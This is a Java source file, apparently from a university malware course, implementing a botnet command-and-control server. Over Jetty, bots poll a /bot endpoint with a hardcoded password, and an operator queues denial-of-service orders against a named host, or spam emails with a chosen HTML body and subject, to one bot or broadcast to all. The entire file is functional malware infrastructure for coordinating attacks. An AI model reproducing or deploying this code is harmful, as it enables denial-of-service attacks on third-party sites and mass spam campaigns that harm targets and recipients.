package es.uc3m.malware.BotServer;

import com.google.gson.*;
import org.eclipse.jetty.server.Server;
import org.eclipse.jetty.servlet.ServletHolder;
import org.eclipse.jetty.webapp.WebAppContext;

import javax.servlet.Servlet;
import javax.servlet.ServletException;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.io.PrintWriter;
import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Set;
import java.util.concurrent.*;
import java.util.logging.Logger;

public class BotServer {

    static final ConcurrentHashMap<String, ConcurrentLinkedQueue<Command>> BOTS = new ConcurrentHashMap<>();
    static final ConcurrentHashMap<String, Date> BOTS_LAST_MESSAGE = new ConcurrentHashMap<>();
    static final DateFormat df = new SimpleDateFormat("dd/MM/yyyy HH:mm:ss");
    public static final String BOT_PATH = "/bot";
    public static final String ADMIN_PATH = "/admin";
    private static final Gson gson = new Gson();
    private final ScheduledExecutorService executor = Executors.newScheduledThreadPool(1);

    private Server server;

    private Runnable botSupervisor = new Runnable() {
        @Override
        public void run() {
            try {
                Date referenceDate = new Date();
                for (String botId : BOTS_LAST_MESSAGE.keySet()) {
                    Date lastMessageDate = BOTS_LAST_MESSAGE.get(botId);
                    long diff = referenceDate.getTime() - lastMessageDate.getTime();
                    if (TimeUnit.MILLISECONDS.toMinutes(diff) >= 5 && BOTS.containsKey(botId)) {
                        BOTS.remove(botId);
                        BOTS_LAST_MESSAGE.remove(botId);
                    }
                }
            } catch (Exception e) {
                Logger.getLogger(BotServer.class.getName()).warning(e.getMessage());
            }
        }
    };

    public static void main(String[] args) {
        try {
            new BotServer().start();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    /**
     * This method configures the server and starts it
     * @throws Exception
     */
    public void start() throws Exception {
        Logger.getLogger(BotServer.class.getName()).info("Server starting");
        // By default jetty server is configured on port 8080 I configured on 8081 because
        // 8080 was already taken
        server = new Server(8081);
        // Basic configuration of the server
        WebAppContext root = new WebAppContext();
        root.setContextPath("/");
        root.setResourceBase("blank");
        root.setParentLoaderPriority(true);
        server.setHandler(root);
        //add the servlet for the bots to connect
        Servlet botServler = new BotServlet();
        ServletHolder botServletHolder = new ServletHolder(botServler);
        root.addServlet(botServletHolder, BOT_PATH);
        Servlet adminServlet = new AdminServlet();
        //add the administrative servlet
        ServletHolder adminServletHolder = new ServletHolder(adminServlet);
        root.addServlet(adminServletHolder,ADMIN_PATH);
        //start the server
        server.start();
        Logger.getLogger(BotServer.class.getName()).info("Server started");
        // schedule the supervision task to update the connected bot list
        executor.scheduleAtFixedRate(botSupervisor, 1, 1, TimeUnit.MINUTES);
    }

    /**
     * This is the administrative servlet where the user sends the commands and the information to send orders to the
     * botnet
     */
    private static class AdminServlet extends HttpServlet{

        @Override
        protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
            //Check if the request contains the command to send and the objective bot
            if (req.getParameterMap().containsKey("botId") && req.getParameterMap().containsKey("command")){
                String botId = req.getParameter("botId");
                //if broadcast is sent as bot id the command will be sent to all the bots on the net
                //if the bot specified as target is not connected send an error
                if (!("broadcast".equalsIgnoreCase(botId) || BOTS.containsKey(botId))) {
                    String response = generateError("bot not found");
                    PrintWriter writer = resp.getWriter();
                    writer.print(response);
                    writer.flush();
                    resp.setStatus(HttpServletResponse.SC_INTERNAL_SERVER_ERROR);
                    return;
                }
                String command = req.getParameter("command");
                switch (command) {
                    case Commands.DOS:
                        //example DOS command
                        //http://127.0.0.1:8081/admin?botId=d6773f29392d49c6&command=DOS&host=http://uc3m.es
                        //check if all the parameters are present on the request
                        if(!req.getParameterMap().containsKey("host")){
                            String response = generateError("host parameter missing");
                            PrintWriter writer = resp.getWriter();
                            writer.print(response);
                            writer.flush();
                            resp.setStatus(HttpServletResponse.SC_INTERNAL_SERVER_ERROR);
                            return;
                        }
                        //get the info of the DOS command and put on the commands queue of the target bot
                        String host = req.getParameter("host");
                        int port = 80;
                        if (req.getParameterMap().containsKey("port") && req.getParameter("port").matches("[0-9]+]")) {
                            port = Integer.parseInt(req.getParameter("port"));
                        }
                        Command DOSCommandToBots = new Command(Commands.DOS, host, Integer.toString(port));
                        queueCommand(botId, DOSCommandToBots);
                        break;
                    case Commands.SPAM:
                        //check if all the parameters are present on the request
                        if (!req.getParameterMap().containsKey("htmlMailBody")){
                            String responseNoEmailBody = generateError("No email's body specified");
                            PrintWriter writerErrNoEmailBody = resp.getWriter();
                            writerErrNoEmailBody.print(responseNoEmailBody);
                            writerErrNoEmailBody.flush();
                            resp.setStatus(HttpServletResponse.SC_INTERNAL_SERVER_ERROR);
                            return;
                        }
                        if (!req.getParameterMap().containsKey("subject")) {
                            String responseNoSubject = generateError("No email's subject specified");
                            PrintWriter writerErrNoSubject = resp.getWriter();
                            writerErrNoSubject.print(responseNoSubject);
                            writerErrNoSubject.flush();
                            resp.setStatus(HttpServletResponse.SC_INTERNAL_SERVER_ERROR);
                            return;
                        }
                        //get the info of the SPAM command and put on the commands queue of the target bot
                        String htmlEmail = req.getParameter("htmlMailBody");
                        String subject = req.getParameter("subject");
                        Command SPAMCommand = new Command(Commands.SPAM, htmlEmail, subject);
                        queueCommand(botId, SPAMCommand);
                        break;
                    default:
                        //Unknown command
                        String response = generateError("command not recognised");
                        PrintWriter writer = resp.getWriter();
                        writer.print(response);
                        writer.flush();
                        return;
                }
                //send the response ok to the user
                String response = generateCommandSentToBots();
                PrintWriter writer = resp.getWriter();
                writer.print(response);
                writer.flush();
                return;
            }
            //send unknown error response to the user
            String response = generateError("Bot id or command missing");
            PrintWriter writer = resp.getWriter();
            writer.print(response);
            writer.flush();
            resp.setStatus(HttpServletResponse.SC_INTERNAL_SERVER_ERROR);
        }

        /**
         * queque the command to the target bot
         * @param botId the id of the target bot or broadcast if the command will be sent to all the bots
         * @param commandToBots command to send
         */
        private void queueCommand(String botId, Command commandToBots) {
            if("broadcast".equalsIgnoreCase(botId)){
                for (String bot : BOTS.keySet()) {
                    BOTS.get(bot).add(commandToBots);
                }
            }else
                BOTS.get(botId).add(commandToBots);
        }

        /**
         * generate the default ok response
         * @return the response in JSON format
         */
        private static String generateCommandSentToBots(){
            JsonObject jsonObject = new JsonObject();
            jsonObject.addProperty("result", "OK");
            jsonObject.addProperty("message", "command sended to bots");
            return gson.toJson(jsonObject);
        }

        /**
         * generate error response
         * @param message the error message to send
         * @return the response in JSON format
         */
        private static String generateError(String message) {
            JsonObject jsonObject = new JsonObject();
            jsonObject.addProperty("result", "ERROR");
            jsonObject.addProperty("message", message);
            return gson.toJson(jsonObject);
        }


        @Override
        protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
            //get te bot list and print it on JSON format
            PrintWriter writer = resp.getWriter();
            Set<String> ids = BOTS.keySet();
            JsonArray botsArray = new JsonArray();
            for (String bot : ids) {
                JsonObject jsonObject = new JsonObject();
                jsonObject.addProperty("id", bot);
                if (BOTS_LAST_MESSAGE.get(bot) != null) {
                    try {
                        jsonObject.addProperty("lastPing",df.format(BOTS_LAST_MESSAGE.get(bot)));
                    } catch (Exception e) {
                        Logger.getLogger(BotServer.class.getName()).warning(e.toString());
                    }
                }
                botsArray.add(jsonObject);
            }
            JsonObject respObject = new JsonObject();
            respObject.add("bots",botsArray);
            writer.print(gson.toJson(respObject));
            writer.flush();
        }
    }

    /**
     * This is the interface for the bots to interact with the server
     */
    private static class BotServlet extends HttpServlet {

        @Override
        protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
            Logger.getLogger(BotServlet.class.getName()).info(req.toString());
            PrintWriter writer = resp.getWriter();

            String response = "";
            //check if the bot has sent its id and the password
            if (req.getParameterMap().containsKey("id") && req.getParameterMap().containsKey("p")
                    && "password".equals(req.getParameter("p"))) {
                String botId = req.getParameter("id");
                //check if the bot is in the connected bots list
                if (BOTS.containsKey(botId)) {
                    //get the next command and send it to the bot
                    Command commandToSend = BOTS.get(botId).poll();
                    if (commandToSend == null) {
                        commandToSend = Command.commandNone;
                    }
                    response = commandToSend.toJson();
                } else {
                    //if the bot was not connected add it to the connected list
                    BOTS.put(botId, new ConcurrentLinkedQueue<Command>());
                    Command commandToSend = Command.commandConnected;
                    response = commandToSend.toJson();
                }
                //update the las message received date
                if(BOTS.containsKey(botId))
                    BOTS_LAST_MESSAGE.put(botId, new Date());
            }
            writer.print(response);
            writer.flush();
        }
    }

    /**
     * basic structure of the command to send to the bot
     */
    private static class Command{

        // default bot connected confirmation command
        public static final Command commandConnected = new Command(Commands.connected);
        // default empty command
        public static final Command commandNone = new Command(Commands.NONE);

        private static final Gson gson = new Gson();

        private String command;
        private String []args;

        public Command(String command, String... args) {
            this.command = command;
            this.args = args;
        }

        /**
         * This function converts the command into a JSON object
         * @return the JSON reperesentation of the command
         */
        public String toJson() {
            JsonObject commandJSON = new JsonObject();
            // put the id of the command
            commandJSON.addProperty("command", command);
            if (args == null) {
                args = new String[0];
            }
            // transform the args into a JSONArray
            JsonArray array = new JsonArray();
            for (String arg : args) {
                array.add(new JsonPrimitive(arg));
            }
            commandJSON.add("args", array);
            return gson.toJson(commandJSON);
        }

    }

    /**
     * This class is for store the command ids
     */
    private static class Commands{
        private static final String connected = "connected";
        private static final String DOS = "DOS";
        private static final String SPAM = "SPAM";
        private static final String NONE = "NONE";
    }


}
